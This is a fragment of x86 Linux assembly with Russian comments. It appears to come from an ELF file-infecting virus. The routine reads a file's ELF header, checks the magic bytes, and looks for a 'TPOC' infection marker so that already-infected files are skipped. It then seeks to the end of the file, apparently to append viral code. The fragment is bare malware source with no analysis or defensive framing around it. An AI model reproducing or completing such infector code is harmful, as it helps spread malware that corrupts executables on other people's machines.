;проверка файла. если файл является эльфом, при этом он не заражен,
;то возвращается длина файла, иначе - 0. на входе в edx file descriptor

fcheck
;===чтение заголовка из файла
mov eax,3
mov edx,34h;sizeofELFheader
lea ecx,[elf]
int 80h
;==================================

cmp dword [e_ident], 464c457fh;проверка сигнатуры
je test2
%ifdef DEBUGVER
errors "It's not ELF  ",_next,errnotelf
%endif
pzdc
null eax
jmp fch_exit
test2
cmp dword [e_ident+9],'TPOC';проверка метки заражения

jne ok
%ifdef DEBUGVER
errors "It has allready infected  ",___next,errinfected
%endif
jmp pzdc
ok

;=====переход к концу файла-на выходе размер
mov eax,19; sys_lseek
null ecx; num of byte to seek
mov edx,2; 0=from begin 1=from curpoz 2=from the end
int 80h
;====================================================

fch_exit
ret
;=========================================================